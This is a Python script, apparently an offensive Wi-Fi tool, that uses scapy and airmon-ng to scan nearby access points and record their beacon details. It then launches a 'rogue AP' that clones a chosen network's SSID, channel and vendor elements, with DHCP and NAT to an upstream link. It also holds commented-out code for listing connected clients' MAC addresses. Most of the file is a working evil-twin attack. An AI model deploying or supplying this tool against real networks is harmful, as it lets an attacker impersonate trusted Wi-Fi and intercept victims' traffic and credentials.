import subprocess
from scapy.all import *
from ap_manager import start_ap
import time

def start_monitor_mode(interface="wlan0"):
    print(f"Starting monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
    subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    print("Monitor mode started.")

def stop_monitor_mode(monitor_interface="wlan0mon"):
    print(f"Stopping monitor mode on {monitor_interface}...")
    subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface], check=True)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], check=True)
    print("Monitor mode stopped.")

def scan_aps(interface="wlan0mon", timeout=15):
    aps = {}

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3
            
            # Only process the first beacon from each BSSID to avoid
            # accumulating duplicate vendor IEs from multiple beacons
            if bssid in aps:
                return
            
            ssid = ''
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            except Exception:
                ssid = ''

            # Collect raw Information Elements (IEs) from the beacon so
            # we can reproduce them later. We also try to extract the
            # channel (DS Param IE, id=3) and beacon interval if present.
            # Use a set to track unique vendor IEs and avoid duplicates.
            vendor_ies = []
            seen_ies = set()
            elt = pkt.getlayer(Dot11Elt)
            channel = None
            while isinstance(elt, Dot11Elt):
                try:
                    # Only include Vendor Specific IEs (ID == 221 / 0xdd)
                    # for hostapd's vendor_elements. Feeding other IE types
                    # into vendor_elements causes hostapd to reject the
                    # configuration as seen in the error.
                    if getattr(elt, 'ID', None) == 221:
                        ie_bytes = bytes(elt)
                        if ie_bytes not in seen_ies:
                            seen_ies.add(ie_bytes)
                            vendor_ies.append(ie_bytes)
                except Exception:
                    # Fallback: construct vendor IE bytes if ID==221
                    try:
                        if getattr(elt, 'ID', None) == 221:
                            ie_bytes = bytes([elt.ID, elt.len]) + (elt.info or b'')
                            if ie_bytes not in seen_ies:
                                seen_ies.add(ie_bytes)
                                vendor_ies.append(ie_bytes)
                    except Exception:
                        pass

                try:
                    if getattr(elt, 'ID', None) == 3 and elt.info and len(elt.info) >= 1:
                        channel = elt.info[0]
                except Exception:
                    pass

                elt = elt.payload

            ies_hex = b''.join(vendor_ies).hex() if vendor_ies else None
            beacon_int = None
            try:
                beacon_layer = pkt.getlayer(Dot11Beacon)
                beacon_int = getattr(beacon_layer, 'beacon_interval', None)
            except Exception:
                beacon_int = None

            aps[bssid] = {
                'ssid': ssid,
                'ies_hex': ies_hex,
                'channel': channel,
                'beacon_int': beacon_int
            }

    print(f"Scanning for Access Points on {interface} for {timeout} seconds...")
    sniff(iface=interface, prn=packet_handler, timeout=timeout, store=0)
    return aps

def scan_clients(ap_bssid, interface="wlan0mon", timeout=20):
    clients = set()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            # Look for packets where either source or destination is the AP's BSSID
            if pkt.addr1 == ap_bssid and pkt.addr2 is not None and pkt.addr2 != 'ff:ff:ff:ff:ff:ff':
                clients.add(pkt.addr2)
            elif pkt.addr2 == ap_bssid and pkt.addr1 is not None and pkt.addr1 != 'ff:ff:ff:ff:ff:ff':
                clients.add(pkt.addr1)

    print(f"Scanning for clients connected to AP {ap_bssid} on {interface} for {timeout}s...")
    sniff(iface=interface, prn=packet_handler, timeout=timeout, store=0)
    return clients

if __name__ == "__main__":
    print("============== Wi-Fi Access Point Scanner ==============")
    show_interfaces()

    interface = input("Enter your interface name (e.g., wlan0): ")
    upstream_iface = input("Enter your upstream interface name (e.g., eth0): ")
    monitor_interface = f"{interface}mon"

    try:
        start_monitor_mode(interface)
        aps = scan_aps(monitor_interface)
        print("\nAccess Points found:")
        for bssid, info in aps.items():
            ssid = info.get('ssid', '')
            ch = info.get('channel')
            print(f"BSSID: {bssid}, SSID: {ssid}, channel: {ch}")
    finally:
        stop_monitor_mode(monitor_interface)
            
    # Ask the user for which BSSID to clone (this preserves unique AP
    # beacon information). If the user prefers to input an SSID, they
    # can instead copy the BSSID printed above.
    selected_bssid = input("\nEnter the BSSID of the AP to clone (e.g. 12:34:56:78:9a:bc): ").strip().lower()
    if selected_bssid not in aps:
        print("BSSID not found in scan results; falling back to asking for SSID")
        selected_ssid = input("Enter the SSID of the AP to create a rogue AP: ")
        selected_bssid = None
    else:
        selected_ssid = aps[selected_bssid].get('ssid', '')

    passphrase = input("Enter the passphrase for the rogue AP: ")

    # Provide beacon customization to start_ap so hostapd will include
    # the original AP's IEs and settings in the rogue beacons.
    beacon_ies = None
    beacon_int = None
    if selected_bssid and selected_bssid in aps:
        beacon_ies = aps[selected_bssid].get('ies_hex')
        beacon_int = aps[selected_bssid].get('beacon_int')
        channel = aps[selected_bssid].get('channel') or 6
    else:
        channel = 6

    rogue_ap_manager = start_ap(interface, selected_ssid, passphrase,
                                "192.168.50.1/24", "192.168.50.10",
                                "192.168.50.100", channel, upstream_iface,
                                beacon_ies=beacon_ies, beacon_int=beacon_int)
    
    try:
        print('\nType "quit" or press Ctrl+C to stop the rogue AP and cleanup.')
        while True:
            try:
                line = input('> ').strip().lower()
            except EOFError:
                break
            except KeyboardInterrupt:
                print('\nInterrupted — stopping rogue AP...')
                break

            if line in ("quit", "exit", "stop"):
                break
            elif line == "status":
                # Quick status: check processes
                hs = 'running' if rogue_ap_manager._hostapd_proc and rogue_ap_manager._hostapd_proc.poll() is None else 'stopped'
                ds = 'running' if rogue_ap_manager._dnsmasq_proc and rogue_ap_manager._dnsmasq_proc.poll() is None else 'stopped'
                print(f"hostapd: {hs}, dnsmasq: {ds}, tmpdir: {rogue_ap_manager._tmpdir}, nat: {rogue_ap_manager._nat_enabled}")
            elif line == "logs":
                # Print a few hostapd stderr lines if available
                if rogue_ap_manager._hostapd_proc and rogue_ap_manager._hostapd_proc.stderr:
                    try:
                        rogue_ap_manager._hostapd_proc.stderr.flush()
                    except Exception:
                        pass
                    print("(hostapd stderr available; run journalctl -u hostapd for full logs)")
                else:
                    print("No hostapd process or no stderr available.")
            elif line == "help":
                print("Commands: status, logs, quit")
            else:
                print('Unknown command. Type "help" for commands or "quit" to exit.')
                
    finally:
        rogue_ap_manager.stop()
        
    # selected_bssid = input("\nEnter the BSSID of the AP to scan for clients: ")
    # clients = scan_clients(selected_bssid, monitor_interface)
    # print(f"\nClients connected to AP {selected_bssid}:")
    # for client in clients:
    #     print(f"Client MAC: {client}")
    